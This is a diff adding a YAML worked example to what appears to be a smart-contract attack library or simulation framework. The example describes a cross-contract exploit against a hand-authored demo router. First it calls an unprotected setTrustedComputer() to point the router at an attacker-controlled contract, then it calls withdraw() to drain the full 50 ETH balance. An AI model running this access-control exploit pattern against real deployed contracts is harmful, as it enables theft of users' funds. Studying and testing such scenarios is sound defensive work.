@@ -1,0 +1,43 @@
+# Worked example for `cross_contract` — no automated builder by design
+# (attack_library/cross_contract/meta.yaml: the vulnerability is
+# defined by the RELATIONSHIP between specific contracts).
+vulnerability_class: cross_contract
+target_protocol: "TrustingRouter (hand-authored demo)"
+hypothesis: >
+  setTrustedComputer() has no access control, letting ANYONE repoint
+  which contract the router treats as its authorization source.
+  withdraw() then blindly trusts whatever that contract reports — the
+  bug isn't in withdraw()'s own logic, it's in who the router was
+  tricked into trusting.
+
+attacker:
+  initial_eth: 0.0
+
+initial_state:
+  fork_url: "https://eth-mainnet.example/rpc"
+  fork_block: 19000000
+  target_contracts:
+    router: "0x6666666666666666666666666666666666666666"
+  balances:
+    router: 50.0
+
+steps:
+  - step_id: 1
+    caller: attacker
+    target: router
+    function: "setTrustedComputer(address)"
+    args: ["malicious_computer"]
+    comment: "repoint the router's trust to an attacker-controlled contract"
+  - step_id: 2
+    caller: attacker
+    target: router
+    function: "withdraw(uint256)"
+    args: [50.0]
+    comment: "the malicious computer authorizes any amount requested"
+
+success_conditions:
+  - expression: "attacker.eth_balance_after - attacker.eth_balance_before >= 50.0"
+    description: "attacker drained the router's full balance via an attacker-controlled trusted dependency"
+
+assumptions:
+  - "mock engine requires both legitimate_computer and malicious_computer aliases registered; only malicious_computer needs to actually exist for this specific attack path"
